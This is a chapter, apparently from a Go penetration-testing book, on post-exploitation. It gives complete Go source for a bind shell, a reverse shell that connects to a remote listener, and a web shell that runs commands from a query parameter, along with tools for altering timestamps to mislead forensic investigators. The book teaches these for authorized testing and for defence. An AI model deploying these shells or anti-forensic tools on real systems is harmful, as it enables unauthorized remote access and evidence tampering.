<html><head></head><body>
        

                            
                    <h1 class="header-title">Post Exploitation</h1>
                
            
            
                
<p class="chapter-content">Post exploitation refers to the phase of a penetration test where a machine has already been exploited and code execution is available. The primary task is generally to maintain persistence so that you can keep a connection alive or leave a way to reconnect later. This chapter covers some common techniques for persistence; namely, bind shells, reverse bind shells, and web shells. We will also look at cross compiling, which is incredibly helpful when compiling shells for different operating systems from a single host.</p>
<p class="chapter-content">Other objectives during the post exploit phase include finding sensitive data, making changes to files, and hiding your tracks so that forensic investigators will not be able to find evidence. You can cover your tracks by changing timestamps on files, modifying permissions, disabling shell history, and removing logs. This chapter covers some techniques for finding interesting files and covering tracks.</p>
<p class="chapter-content"><a href="1368accc-3f1c-4034-948f-009147d26eab.xhtml">Chapter 4</a>, <em>Forensics</em>, is closely related because performing a forensic investigation is not that different from exploring a freshly exploited machine. Both tasks are about learning what is on the system and finding interesting files. Similarly, <a href="e69a87b2-99ff-47cf-a935-4ef39304ed15.xhtml" target="_blank">Chapter 5</a>, <em>Packet Capturing and Injection</em>, is useful for doing network analysis from an exploited host. Many of the tools such as finding large files or finding recently modified files are helpful during this phase too. Refer to <a href="1368accc-3f1c-4034-948f-009147d26eab.xhtml" target="_blank">Chapter 4</a>, <em>Forensics</em>, and <a href="e69a87b2-99ff-47cf-a935-4ef39304ed15.xhtml" target="_blank">Chapter 5</a>, <em>Packet Capturing and Injection</em>, for more examples that can be used during the post exploitation phase.</p>
<p class="chapter-content">The post exploitation phase covers a wide variety of tasks, including privilege escalation, pivoting, stealing or destroying data, and host and network analyses. Because the scope is so broad and varies widely depending on the type of system you have exploited, this chapter focuses on a narrow scope of topics that should be useful in most scenarios.</p>
<p class="chapter-content">When going through these exercises, try to look at things from the perspective of an attacker. Taking on this mindset while working through the examples will help you understand how to better protect your systems.</p>
<p class="chapter-content">In this chapter, we will cover the following topics:</p>
<ul>
<li>Cross compiling</li>
<li>Bind shells</li>
<li>Reverse bind shells</li>
<li>Web shells</li>
<li>Finding files with write permissions</li>
<li>Modifying file timestamps</li>
<li>Modifying file permissions</li>
<li>Modifying file ownership</li>
</ul>


            

            
        
    

        

                            
                    <h1 class="header-title">Cross compiling</h1>
                
            
            
                
<p class="chapter-content">Cross compiling is a feature that comes with Go and is very easy to use. It can be particularly useful if you are on a Linux machine performing a penetration test and you need to compile a custom reverse shell that will run on a Windows machine that you compromised.</p>
<p class="chapter-content">You can target several architectures and operating systems, and all you need to do is modify an environment variable. There is no need for any extra tools or compilers. Everything is built in for Go.</p>
<p class="chapter-content">Simply change the <kbd>GOARCH</kbd> and <kbd>GOOS</kbd> environment variables to match your desired build target. You can build for Windows, Mac, Linux, and more. You can also build for the prominent 32-bit and 64-bit desktop processors as well as ARM and MIPS for devices such as the Raspberry Pi.</p>
<p class="chapter-content">As of this writing, the possible values for <kbd>GOARCH</kbd> are as follows:</p>
<table class="MsoTableGrid">
<tbody>
<tr>
<td>
<p><kbd>386</kbd></p>
</td>
<td>
<p><kbd>amd64</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>amd64p32</kbd></p>
</td>
<td>
<p><kbd>arm</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>armbe</kbd></p>
</td>
<td>
<p><kbd>arm64</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>arm64be</kbd></p>
</td>
<td>
<p><kbd>ppc64</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>ppc64le</kbd></p>
</td>
<td>
<p><kbd>mips</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>mipsle</kbd></p>
</td>
<td>
<p><kbd>mips64</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>mips64le</kbd></p>
</td>
<td>
<p><kbd>mips64p32</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>mips64p32le</kbd></p>
</td>
<td>
<p><kbd>ppc</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>s390</kbd></p>
</td>
<td>
<p><kbd>s390x</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>sparc</kbd></p>
</td>
<td>
<p><kbd>sparc64</kbd></p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<p class="chapter-content">The options for <kbd>GOOS</kbd> are as follows:</p>
<table class="MsoTableGrid">
<tbody>
<tr>
<td>
<p><kbd>android</kbd></p>
</td>
<td>
<p><kbd>darwin</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>dragonfly</kbd></p>
</td>
<td>
<p><kbd>freebsd</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>linux</kbd></p>
</td>
<td>
<p><kbd>nacl</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>netbsd</kbd></p>
</td>
<td>
<p><kbd>openbsd</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>plan9</kbd></p>
</td>
<td>
<p><kbd>solaris</kbd></p>
</td>
</tr>
<tr>
<td>
<p><kbd>windows</kbd></p>
</td>
<td>
<p><kbd>zos</kbd></p>
</td>
</tr>
</tbody>
</table>
<p> </p>
<p class="chapter-content">Note that not every architecture can be used with every operating system. Refer to the Go official documentation (<a href="https://golang.org/doc/install/source#environment" target="_blank">https://golang.org/doc/install/source#environment</a>) to know which architectures and operating systems can be combined.</p>
<p class="chapter-content">If you are targeting the ARM platform, you can optionally specify the ARM version by setting the <kbd>GOARM</kbd> environment variable. A reasonable default is chosen automatically, and it is recommended that you do not change it. The possible <kbd>GOARM</kbd> values are <kbd>5</kbd>, <kbd>6</kbd>, and <kbd>7</kbd>, at the time of this writing.</p>
<p class="chapter-content">In Windows, set the environment variables in Command Prompt, as given here:</p>
<pre><strong>Set GOOS=linux</strong>
<strong>Set GOARCH=amd64</strong>
<strong>go build myapp</strong></pre>
<p class="chapter-content">In Linux/Mac you can also set the environment variables in a number of ways, but you can specify it for a single build command like this:</p>
<pre><strong>GOOS=windows GOARCH=amd64 go build mypackage</strong>  </pre>
<p>Read more about environment variables and cross compiling at <a href="https://golang.org/doc/install/source#environment" target="_blank">https://golang.org/doc/install/source#environment</a>.</p>
<p class="chapter-content">This method of cross compiling was introduced with Go 1.5. Before that, a shell script was provided by the Go developers, but it is no longer supported, and it is archived at <a href="https://github.com/davecheney/golang-crosscompile/tree/archive">https://github.com/davecheney/golang-crosscompile/tree/archive</a>.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Creating bind shells</h1>
                
            
            
                
<p class="chapter-content">Bind shells are programs that bind to a port and listen for connections and serves shells. Whenever a connection is received, it runs a shell, such as Bash, and passes off the standard input, output, and error handles to the remote connection. It can listen forever and serve shells to multiple incoming connections.</p>
<p class="chapter-content">Bind shells are useful when you want to add persistent access to a machine. You can run the bind shell and then disconnect or inject the bind shell into memory through a remote code execution vulnerability.</p>
<p class="chapter-content">The biggest problem with bind shells is that firewalls and the NAT routing can prevent direct remote access to the computer. Incoming connections are usually blocked or routed in a way that prevent connecting to the bind shell. For this reason, reverse bind shells are often used. The next section covers reverse bind shells.</p>
<p class="chapter-content">When compiling this example on Windows, it comes out to 1,186 bytes. Considering that some shells written in C/Assembly can be under 100 bytes, it could be considered relatively large. If you are exploiting an application, you may have very limited space to inject a bind shell. You could make the example smaller by omitting the <kbd>log</kbd> package, removing the optional command-line arguments, and ignoring errors.</p>
<p class="chapter-content">TLS can be used instead of plaintext by swapping <kbd>net.Listen()</kbd> with <kbd>tls.Listen()</kbd>. <a href="f68073f0-8cc8-40b5-af0e-795ce30e5271.xhtml" target="_blank">Chapter 6</a>, <em>Cryptography</em>, has an example of a TLS client and server.</p>
<p class="chapter-content">Interfaces are a powerful feature of Go, and their convenience is exemplified here with the reader and writer interfaces. The only requirement to satisfy the reader and writer interfaces is to implement the <kbd>.Read()</kbd> and <kbd>.Write()</kbd> functions, respectively, for the type. Here, the network connection implements the <kbd>Read()</kbd> and <kbd>Write()</kbd> functions and so does <kbd>exec.Command</kbd>. We tie the reader and writer interfaces together easily because of the shared interfaces they implement.</p>
<p class="chapter-content">In this next example, we look at creating a bind shell for Linux, using the built-in <kbd>/bin/sh</kbd> shell. It will bind and listen for connections, serving a shell to anyone who connects:</p>
<pre>// Call back to a remote server and open a shell session<br/>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "net"<br/>   "os"<br/>   "os/exec"<br/>)<br/><br/>var shell = "/bin/sh"<br/><br/>func main() {<br/>   // Handle command line arguments<br/>   if len(os.Args) != 2 {<br/>      fmt.Println("Usage: " + os.Args[0] + " &lt;bindAddress&gt;")<br/>      fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")<br/>      os.Exit(1)<br/>   }<br/><br/>   // Bind socket<br/>   listener, err := net.Listen("tcp", os.Args[1])<br/>   if err != nil {<br/>      log.Fatal("Error connecting. ", err)<br/>   }<br/>   log.Println("Now listening for connections.")<br/><br/>   // Listen and serve shells forever<br/>   for {<br/>      conn, err := listener.Accept()<br/>      if err != nil {<br/>         log.Println("Error accepting connection. ", err)<br/>      }<br/>      go handleConnection(conn)<br/>   }<br/><br/>}<br/><br/>// This function gets executed in a thread for each incoming connection<br/>func handleConnection(conn net.Conn) {<br/>   log.Printf("Connection received from %s. Opening shell.", <br/>   conn.RemoteAddr())<br/>   conn.Write([]byte("Connection established. Opening shell.\n"))<br/><br/>   // Use the reader/writer interface to connect the pipes<br/>   command := exec.Command(shell)<br/>   command.Stdin = conn<br/>   command.Stdout = conn<br/>   command.Stderr = conn<br/>   command.Run()<br/><br/>   log.Printf("Shell ended for %s", conn.RemoteAddr())<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Creating reverse bind shells</h1>
                
            
            
                
<p class="chapter-content">Reverse bind shells overcome the firewall and NAT issue. Instead of listening for incoming connections, it dials out to a remote server (one you control and are listening on). When you get the connection on your machine, you have a shell that is running on the computer behind the firewall.</p>
<p class="chapter-content">This example uses plaintext TCP sockets, but you can easily swap <kbd>net.Dial()</kbd> with <kbd>tls.Dial()</kbd>. <a href="f68073f0-8cc8-40b5-af0e-795ce30e5271.xhtml" target="_blank">Chapter 6</a>, <em>Cryptography</em>, has examples of a TLS client and server if you want to modify these examples to use TLS.</p>
<pre>// Call back to a remote server and open a shell session<br/>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "net"<br/>   "os"<br/>   "os/exec"<br/>)<br/><br/>var shell = "/bin/sh"<br/><br/>func main() {<br/>   // Handle command line arguments<br/>   if len(os.Args) &lt; 2 {<br/>      fmt.Println("Usage: " + os.Args[0] + " &lt;remoteAddress&gt;")<br/>      fmt.Println("Example: " + os.Args[0] + " 192.168.0.27:9999")<br/>      os.Exit(1)<br/>   }<br/><br/>   // Connect to remote listener<br/>   remoteConn, err := net.Dial("tcp", os.Args[1])<br/>   if err != nil {<br/>      log.Fatal("Error connecting. ", err)<br/>   }<br/>   log.Println("Connection established. Launching shell.")<br/><br/>   command := exec.Command(shell)<br/>   // Take advantage of reader/writer interfaces to tie inputs/outputs<br/>   command.Stdin = remoteConn<br/>   command.Stdout = remoteConn<br/>   command.Stderr = remoteConn<br/>   command.Run()<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Creating web shells</h1>
                
            
            
                
<p class="chapter-content">A web shell is similar to a bind shell, but, instead of listening as a raw TCP socket, it listens and communicates as an HTTP server. It is a useful method of creating persistent access to a machine.</p>
<p class="chapter-content">One reason a web shell may be necessary, is because of firewalls or other network restrictions. HTTP traffic may be treated differently than other traffic. Sometimes the <kbd>80</kbd> and <kbd>443</kbd> ports are the only ports allowed through a firewall. Some networks may inspect the traffic to ensure that only HTTP formatted requests are allowed through.</p>
<p class="chapter-content">Keep in mind that using plain HTTP means the traffic can be logged in plaintext. HTTPS can be used to encrypt the traffic, but the SSL certificate and key are going to reside on the server so that a server admin will have access to it. All you need to do to make this example use SSL is to change <kbd>http.ListenAndServe()</kbd> to <kbd>http.ListenAndServeTLS()</kbd>. An example of this is provided in <a href="f15910a1-239e-49a5-b4d9-3881a524bfa9.xhtml" target="_blank">Chapter 9</a>, <em>Web Applications</em>.</p>
<p class="chapter-content">The convenient thing about a web shell is that you can use any web browser and command-line tools, such as <kbd>curl</kbd> or <kbd>wget</kbd>. You could even use <kbd>netcat</kbd> and manually craft an HTTP request. The drawback is that you don't have a truly interactive shell, and you can send only one command at a time. You can run multiple commands with one string if you separate multiple commands with a semicolon.</p>
<p class="chapter-content">You can manually craft an HTTP request in <kbd>netcat</kbd> or a custom TCP client like this:</p>
<pre><strong>GET /?cmd=whoami HTTP/1.0\n\n</strong>  </pre>
<p class="chapter-content">This would be similar to the request that is created by a web browser. For example, if you ran <kbd>webshell localhost:8080</kbd>, you could access the URL on port <kbd>8080</kbd>, and run a command with <kbd>http://localhost:8080/?cmd=df</kbd>.</p>
<p class="chapter-content">Note that the <kbd>/bin/sh</kbd> shell command is for Linux and Mac. Windows uses the <kbd>cmd.exe</kbd> Command Prompt. In Windows, you can enable Windows Subsystem for Linux and install Ubuntu from the Windows store to run all of these Linux examples in a Linux environment without installing a virtual machine.</p>
<p class="chapter-content">In this next example, the web shell creates a simple web server that listens for requests over HTTP. When it receives a request, it looks for the <kbd>GET</kbd> query named <kbd>cmd</kbd>. It will execute a shell, run the command provided, and return the results as an HTTP response:</p>
<pre>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "net/http"<br/>   "os"<br/>   "os/exec"<br/>)<br/><br/>var shell = "/bin/sh"<br/>var shellArg = "-c"<br/><br/>func main() {<br/>   if len(os.Args) != 2 {<br/>      fmt.Printf("Usage: %s &lt;listenAddress&gt;\n", os.Args[0])<br/>      fmt.Printf("Example: %s localhost:8080\n", os.Args[0])<br/>      os.Exit(1)<br/>   }<br/><br/>   http.HandleFunc("/", requestHandler)<br/>   log.Println("Listening for HTTP requests.")<br/>   err := http.ListenAndServe(os.Args[1], nil)<br/>   if err != nil {<br/>      log.Fatal("Error creating server. ", err)<br/>   }<br/>}<br/><br/>func requestHandler(writer http.ResponseWriter, request *http.Request) {<br/>   // Get command to execute from GET query parameters<br/>   cmd := request.URL.Query().Get("cmd")<br/>   if cmd == "" {<br/>      fmt.Fprintln(<br/>         writer,<br/>         "No command provided. Example: /?cmd=whoami")<br/>      return<br/>   }<br/><br/>   log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)<br/>   fmt.Fprintf(writer, "You requested command: %s\n", cmd)<br/><br/>   // Run the command<br/>   command := exec.Command(shell, shellArg, cmd)<br/>   output, err := command.Output()<br/>   if err != nil {<br/>      fmt.Fprintf(writer, "Error with command.\n%s\n", err.Error())<br/>   }<br/><br/>   // Write output of command to the response writer interface<br/>   fmt.Fprintf(writer, "Output: \n%s\n", output)<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Finding writable files</h1>
                
            
            
                
<p class="chapter-content">Once you gain access to a system, you want to start exploring. Typically, you will look for ways to escalate your privilege or maintain persistence. A great way to look for methods of persistence is to identify which files have write permissions.</p>
<p class="chapter-content">You can look at the file permission settings and see if you or everyone has write permission. You can look explicitly for modes such as <kbd>777</kbd>, but a better way is to use a bitmask and look specifically at the write permission bits.</p>
<p class="chapter-content">The permissions are represented by several bits: the user permissions, group permissions, and finally, the permissions for everyone. The string representation of a <kbd>0777</kbd> permission would look like this: <kbd>-rwxrwxrwx</kbd>. The bit we are interested in is the one that gives everyone the write permission, which is represented by <kbd>--------w-</kbd>.</p>
<p class="chapter-content">The second bit is the only one we care about, so we will use a bitwise AND to mask the file's permission with <kbd>0002</kbd>. If the bit was set, it will remain the only bit set. If it was off, it remains off and the entire value will be <kbd>0</kbd>. To check the write bit for the group or the user, you could bitwise AND with <kbd>0020</kbd> and <kbd>0200</kbd> respectively.</p>
<p class="chapter-content">To search recursively through a directory, Go provides a <kbd>path/filepath</kbd> package in the standard library. This function simply takes a starting directory and a function. It performs the function on every file found. The function it expects is actually a specially defined type. It is defined like this:</p>
<pre>type WalkFunc func(path string, info os.FileInfo, err error) error  </pre>
<p class="chapter-content">As long as you create a function that matches this format, your function will be compatible with the <kbd>WalkFunc</kbd> type and can be used in the <kbd>filepath.Walk()</kbd> function.</p>
<p class="chapter-content">In this next example, we will walk-through a starting directory and check the file permissions of each file. We will also cover subdirectories. Any file that is writable by your current user will be printed to the standard output:</p>
<pre>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "os"<br/>   "path/filepath"<br/>)<br/><br/>func main() {<br/>   if len(os.Args) != 2 {<br/>      fmt.Println("Recursively look for files with the " + <br/>         "write bit set for everyone.")<br/>      fmt.Println("Usage: " + os.Args[0] + " &lt;path&gt;")<br/>      fmt.Println("Example: " + os.Args[0] + " /var/log")<br/>      os.Exit(1)<br/>   }<br/>   dirPath := os.Args[1]<br/><br/>   err := filepath.Walk(dirPath, checkFilePermissions)<br/>   if err != nil {<br/>      log.Fatal(err)<br/>   }<br/>}<br/><br/>func checkFilePermissions(<br/>   path string,<br/>   fileInfo os.FileInfo,<br/>   err error,<br/>) error {<br/>   if err != nil {<br/>      log.Print(err)<br/>      return nil<br/>   }<br/><br/>   // Bitwise operators to isolate specific bit groups<br/>   maskedPermissions := fileInfo.Mode().Perm() &amp; 0002<br/>   if maskedPermissions == 0002 {<br/>      fmt.Println("Writable: " + fileInfo.Mode().Perm().String() + <br/>         " " + path)<br/>   }<br/><br/>   return nil<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Changing file timestamp</h1>
                
            
            
                
<p class="chapter-content">In the same way you can modify file permissions, you can modify the timestamps to make it look like it was modified in the past or in the future. This can be useful for covering your tracks and making it look like a file that has not been accessed in a long time or set it for a future date to confuse forensic investigators. The Go <kbd>os</kbd> package contains the utilities for modifying files.</p>
<p class="chapter-content">In this next example, a file's timestamp is modified to look like it was modified in the future. You can tweak the <kbd>futureTime</kbd> variable to make a file look like it has been modified to any specific time. This example provides a relative time by adding 50 hours and 15 minutes to the current time, but you can also specify an absolute time:</p>
<pre>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "os"<br/>   "time"<br/>)<br/><br/>func main() {<br/>   if len(os.Args) != 2 {<br/>      fmt.Printf("Usage: %s &lt;filename&gt;", os.Args[0])<br/>      fmt.Printf("Example: %s test.txt", os.Args[0])<br/>      os.Exit(1)<br/>   }<br/><br/>   // Change timestamp to a future time<br/>   futureTime := time.Now().Add(50 * time.Hour).Add(15 * time.Minute)<br/>   lastAccessTime := futureTime<br/>   lastModifyTime := futureTime<br/>   err := os.Chtimes(os.Args[1], lastAccessTime, lastModifyTime)<br/>   if err != nil {<br/>      log.Println(err)<br/>   }<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Changing file permissions</h1>
                
            
            
                
<p class="chapter-content">Changing the permission of a file so that you can access it later from a lower-privileged user may also be useful. This example demonstrates how to change file permissions using the <kbd>os</kbd> package. You can change file permissions easily using the <kbd>os.Chmod()</kbd> function.</p>
<p class="chapter-content">This program is named <kbd>chmode.go</kbd> so that it does not conflict with the default <kbd>chmod</kbd> program provided on most systems. It has the same basic functionality as <kbd>chmod</kbd>, but without any extra features.</p>
<p class="chapter-content">The <kbd>os.Chmod()</kbd> function is straightforward, but it must be provided an <kbd>os.FileMode</kbd> type. The <kbd>os.FileMode</kbd> type is simply a <kbd>uint32</kbd> type so that you can provide it a <kbd>uint32</kbd> literal (a hardcoded number) or you will have to ensure that the file mode value you provide is casted to an <kbd>os.FileMode</kbd> type. In this example, we will take the string value provided from the command line (for example, <kbd>"777"</kbd>) and convert it to an unsigned integer. We will tell <kbd>strconv.ParseUint()</kbd> to treat it as a base 8 octal number instead of a base 10 decimal number. We also provide <kbd>strconv.ParseUint()</kbd> a parameter of 32 so that we get a 32-bit number back instead of 64-bit number. After we have an unsigned 32-bit integer from the string value, we will cast it to an <kbd>os.FileMode</kbd> type. This is how <kbd>os.FileMode</kbd> is defined in the standard library:</p>
<pre>type FileMode uint32  </pre>
<p class="chapter-content">In this next example, a file's permissions are changed to the value provided as a command-line argument. It behaves similarly to the <kbd>chmod</kbd> program in Linux and accepts permissions in octal format:</p>
<pre>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "os"<br/>   "strconv"<br/>)<br/><br/>func main() {<br/>   if len(os.Args) != 3 {<br/>      fmt.Println("Change the permissions of a file.")<br/>      fmt.Println("Usage: " + os.Args[0] + " &lt;mode&gt; &lt;filepath&gt;")<br/>      fmt.Println("Example: " + os.Args[0] + " 777 test.txt")<br/>      fmt.Println("Example: " + os.Args[0] + " 0644 test.txt")<br/>      os.Exit(1)<br/>   }<br/>   mode := os.Args[1]<br/>   filePath := os.Args[2]<br/><br/>   // Convert the mode value from string to uin32 to os.FileMode<br/>   fileModeValue, err := strconv.ParseUint(mode, 8, 32)<br/>   if err != nil {<br/>      log.Fatal("Error converting permission string to octal value. ", <br/>         err)<br/>   }<br/>   fileMode := os.FileMode(fileModeValue)<br/><br/>   err = os.Chmod(filePath, fileMode)<br/>   if err != nil {<br/>      log.Fatal("Error changing permissions. ", err)<br/>   }<br/>   fmt.Println("Permissions changed for " + filePath)<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Changing file ownership</h1>
                
            
            
                
<p class="chapter-content">This program will take the file provided and change the user and group ownership. This could be used in tandem with the example that finds files that you have permission to modify.</p>
<p class="chapter-content">Go provides <kbd>os.Chown()</kbd> in the standard library, but it does not accept string values for the user and group names. The user and group must be provided as integer ID values. Fortunately, Go also comes with an <kbd>os/user</kbd> package that contains functions for looking up an ID based on a name. These functions are <kbd>user.Lookup()</kbd> and <kbd>user.LookupGroup()</kbd>.</p>
<p class="chapter-content">You could look up your own user and group information on Linux/Mac with the <kbd>id</kbd>, <kbd>whoami</kbd>, and <kbd>groups</kbd> commands.</p>
<p class="chapter-content">Note that this does not work on Windows because ownership is treated differently. The following is the code implementation of this example:<br/></p>
<pre>package main<br/><br/>import (<br/>   "fmt"<br/>   "log"<br/>   "os"<br/>   "os/user"<br/>   "strconv"<br/>)<br/><br/>func main() {<br/>   // Check command line arguments<br/>   if len(os.Args) != 4 {<br/>      fmt.Println("Change the owner of a file.")<br/>      fmt.Println("Usage: " + os.Args[0] + <br/>         " &lt;user&gt; &lt;group&gt; &lt;filepath&gt;")<br/>      fmt.Println("Example: " + os.Args[0] +<br/>         " dano dano test.txt")<br/>      fmt.Println("Example: sudo " + os.Args[0] + <br/>         " root root test.txt")<br/>      os.Exit(1)<br/>   }<br/>   username := os.Args[1]<br/>   groupname := os.Args[2]<br/>   filePath := os.Args[3]<br/><br/>   // Look up user based on name and get ID<br/>   userInfo, err := user.Lookup(username)<br/>   if err != nil {<br/>      log.Fatal("Error looking up user "+username+". ", err)<br/>   }<br/>   uid, err := strconv.Atoi(userInfo.Uid)<br/>   if err != nil {<br/>      log.Fatal("Error converting "+userInfo.Uid+" to integer. ", err)<br/>   }<br/><br/>   // Look up group name and get group ID<br/>   group, err := user.LookupGroup(groupname)<br/>   if err != nil {<br/>      log.Fatal("Error looking up group "+groupname+". ", err)<br/>   }<br/>   gid, err := strconv.Atoi(group.Gid)<br/>   if err != nil {<br/>      log.Fatal("Error converting "+group.Gid+" to integer. ", err)<br/>   }<br/><br/>   fmt.Printf("Changing owner of %s to %s(%d):%s(%d).\n",<br/>      filePath, username, uid, groupname, gid)<br/>   os.Chown(filePath, uid, gid)<br/>} </pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Summary</h1>
                
            
            
                
<p class="chapter-content">Having reading this chapter, you should now have a high-level understanding of the post exploitation phase of an attack. By working through the examples and taking on the mindset of an attacker, you should have developed a better understanding of how to protect your files and network. It is primarily about persistence and information gathering. You can also use an exploited machine to perform all of the examples from <a href="25a78b3b-7295-4deb-9297-a1803c2edb71.xhtml" target="_blank">Chapter 11</a>, <em>Host Discovery and Enumeration</em>.</p>
<p class="chapter-content">The bind shell, reverse bind shell, and web shell were examples of techniques attackers use to maintain persistence. Even if you never need to employ a bind shell, it is important to understand what it is and how attackers use it if you want to identify malicious behavior and keep your systems secure. You can use the port-scanning examples from <a href="25a78b3b-7295-4deb-9297-a1803c2edb71.xhtml" target="_blank">Chapter 11</a>, <em>Host Discovery and Enumeration</em>, to search for machines with a listening bind shell. You can use packet capturing from <a href="e69a87b2-99ff-47cf-a935-4ef39304ed15.xhtml" target="_blank">Chapter 5</a>, <em>Packet Capturing and Injection</em>, to look for outgoing reverse bind shells.</p>
<p class="chapter-content">Finding writable files gives you the tools necessary to look through a filesystem. The <kbd>Walk()</kbd> function demonstration is incredibly powerful and can be adapted for many use cases. You can easily adapt it to search for files with different characteristics. For example, maybe you want to narrow down the search to look for files that are owned by root but also writable to you, or you want to find files of a certain extension.</p>
<p class="chapter-content">What other things would you look for on a machine that you just gained access to? Can you think of any other methods of regaining access once you disconnect? Cron jobs are one way you can execute code, if you find a cron job that executes a script that you have write access to. If you are able to modify a cron script, then you could potentially have a reverse shell call out to you every day so that you don't have to maintain an active session, which is easier to find using a tool such as <kbd>netstat</kbd> to identify established connections.</p>
<p class="chapter-content">Remember, be responsible whenever testing or performing a penetration test. Even if you have a full scope, it is imperative that you understand the possible consequences of any actions you take. For example, if you are performing a penetration test for a client, and you have full scope, you may find a vulnerability on a production system. You may consider installing a bind shell backdoor to prove you can maintain persistence. If we consider a production server that faces the internet, it would be very irresponsible to leave a bind shell open to the whole internet with no encryption and no password on a production system. If you are ever unsure about the repercussions of certain software or certain commands, don't be afraid to ask others who are knowledgeable.</p>
<p class="chapter-content">In the next chapter, we will recap the topics you have learned throughout this book. I will provide some more thoughts on the use of Go for security, which I hope you take away from this book, and we will talk about where to go from here and where to find help. We will also reflect once more on the legal, ethical, and technical boundaries involved with using the information from this book.</p>


            

            
        
    </body></html>